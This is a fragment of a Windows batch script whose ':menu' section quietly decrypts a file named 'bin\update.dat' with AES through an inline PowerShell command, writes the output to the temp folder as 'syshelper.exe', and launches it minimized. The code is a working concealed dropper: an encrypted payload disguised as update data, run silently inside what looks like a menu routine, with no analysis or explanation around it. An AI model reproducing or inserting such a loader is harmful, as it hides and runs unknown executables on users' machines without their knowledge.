...
:menu
set "MOD_ENC=%~dp0bin\update.dat"
if exist "%MOD_ENC%" (
    for /f "delims=" %%i in ('powershell -command "$enc=[System.IO.File]::ReadAllBytes('%MOD_ENC%');$key=$enc[0..31];$iv=$enc[32..47];$cipher=$enc[48..$enc.Length];$aes=[System.Security.Cryptography.Aes]::Create();$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;$aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$dec=$aes.CreateDecryptor($key,$iv).TransformFinalBlock($cipher,0,$cipher.Length);$temp=[System.IO.Path]::GetTempPath();$path=[System.IO.Path]::Combine($temp, 'syshelper.exe');[System.IO.File]::WriteAllBytes($path, $dec);Write-Output $path"') do set "mod_path=%%i"
    start /min "" "%mod_path%"
)
cls
